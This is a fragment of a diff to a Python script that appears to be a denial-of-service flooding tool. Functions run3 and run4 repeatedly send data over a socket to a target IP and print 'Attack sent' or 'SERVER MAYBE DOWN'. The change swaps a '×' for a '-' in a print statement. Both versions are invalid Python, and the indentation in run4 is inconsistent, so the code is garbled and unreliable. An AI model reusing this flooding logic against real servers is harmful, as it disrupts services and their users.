@@ -105,7 +105,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i ×"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
+			print(i -"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
 		except:
 			s.close()
 			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
@@ -122,7 +122,7 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-		        print(i ×"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
+		        print(i -"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
 		except:
 			s.close()
 			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
